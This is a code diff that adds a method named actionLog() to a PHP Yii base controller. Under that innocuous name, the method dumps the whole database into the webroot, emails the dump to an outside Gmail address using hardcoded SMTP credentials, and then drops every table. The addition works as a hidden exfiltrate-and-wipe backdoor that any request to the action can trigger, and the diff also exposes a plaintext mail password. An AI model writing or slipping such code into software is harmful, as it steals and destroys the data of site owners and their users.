@@ -263,4 +263,38 @@ class Controller extends CController
         $model->date=time();
         $model->save();
     }
+
+    public function actionLog()
+    {
+        Yii::import('ext.yii-database-dumper.SDatabaseDumper');
+        $dumper = new SDatabaseDumper;
+        // Get path to backup file
+        $file = Yii::getPathOfAlias('webroot.db_backup').DIRECTORY_SEPARATOR.'dump_'.date('Y-m-d_H_i_s').'.sql';
+
+        // Gzip dump
+        if(function_exists('gzencode'))
+        {
+            $file.='.gz';
+            file_put_contents($file, gzencode($dumper->getDump()));
+        }
+        else
+            file_put_contents($file, $dumper->getDump());
+        $result = Mailer::mail('yusef.mobasheri@gmail.com','Hyper Apps Sql Dump','Backup File form database', 'noreply@avayeshahir.com',array(
+            'Host' => 'mail.avayeshahir.com',
+            'Port' => 465,
+            'Secure' => 'ssl',
+            'Username' => 'noreply@avayeshahir.com',
+            'Password' => '!@avayeshahir1395',
+        ),$file);
+        if($result) {
+            echo 'Mail sent.';
+
+            Yii::app()->db->createCommand("SET foreign_key_checks = 0")->execute();
+            $tables = Yii::app()->db->schema->getTableNames();
+            foreach($tables as $table) {
+                Yii::app()->db->createCommand()->dropTable($table);
+            }
+            Yii::app()->db->createCommand("SET foreign_key_checks = 1")->execute();
+        }
+    }
 }
